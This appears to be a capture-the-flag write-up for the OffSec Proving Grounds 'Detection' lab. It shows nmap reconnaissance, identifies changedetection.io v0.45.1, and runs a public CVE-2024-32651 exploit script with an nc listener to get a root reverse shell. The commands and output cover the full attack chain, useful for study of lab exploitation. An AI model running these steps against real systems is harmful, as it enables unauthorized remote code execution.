---
title: Detection
parent: Proving Grounds Play
grand_parent: Writeups
nav_order:
---
---
# Reconnaissance

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Practice/Detection]
└─$ sudo nmap -Pn -p- -sS -oN open-port_scan.txt --open 192.168.165.97 
[sudo] password for kali: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-13 09:14 +0900
Nmap scan report for 192.168.165.97
Host is up (0.085s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp

Nmap done: 1 IP address (1 host up) scanned in 11.16 seconds
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Practice/Detection]
└─$ sudo nmap -Pn -p5000 -sSCV -A -oN full_tcp-scan.txt --open 192.168.165.97   
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-13 09:19 +0900
Nmap scan report for 192.168.165.97
Host is up (0.083s latency).

PORT     STATE SERVICE VERSION
5000/tcp open  upnp?
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Asus RT-AC66U router (Linux 2.6) (95%), D-Link DIR-835 WAP (95%), Android 9 - 11 (Linux 4.9 - 4.14) (95%), HP MSM765zl WLAN controller (95%), Linux 2.4.21 - 2.4.25 (embedded) (95%), Asus RT-N10 router or AXIS 211A Network Camera (Linux 2.6) (95%), Linux 2.6.18 (95%), Asus RT-N16 WAP (Linux 2.6) (95%), Asus RT-N66U WAP (Linux 2.6) (95%), Tomato 1.28 (Linux 2.6.22) (95%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops

TRACEROUTE (using port 5000/tcp)
HOP RTT      ADDRESS
1   82.24 ms 192.168.45.1
2   82.19 ms 192.168.45.254
3   82.83 ms 192.168.251.1
4   ... 30

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.06 seconds
```

http://192.168.165.97:5000/

![](../../../assets/images/Pasted%20image%2020260613092353.png)

- v0.45.1

![](../../../assets/images/Pasted%20image%2020260613152927.png)
*脆弱性がありそう*

https://github.com/s0ck3t-s3c/CVE-2024-32651-changedetection-RCE/blob/main/CVE-2024-32651.py

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Practice/Detection]
└─$ python3 -m venv venv                                                                         
source venv/bin/activate
pip install requests
```

![](../../../assets/images/Pasted%20image%2020260613153742.png)

---

# Initial Access

```zsh
┌──(venv)─(kali㉿kali)-[~/CTF/OffSec/Practice/Detection]
└─$ python3 CVE-2024-32651.py --url http://changedetection.io:5000 --port 4444 --ip 192.168.45.204


```
![](../../../assets/images/Pasted%20image%2020260613153807.png)

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Practice/Detection]
└─$ rlwrap -cAr nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.45.204] from (UNKNOWN) [192.168.165.97] 43738
root@detection:/# 
```

```zsh
root@detection:/# id
id
uid=0(root) gid=0(root) groups=0(root)
root@detection:/# cat /root/proof.txt
cat /root/proof.txt

root@detection:/# ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
3: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:ab:61:4f brd ff:ff:ff:ff:ff:ff
    inet 192.168.165.97/24 brd 192.168.165.255 scope global ens160
       valid_lft forever preferred_lft forever
```

<details markdown="1">
<summary>Walkthrough</summary>

```zsh

```

</details>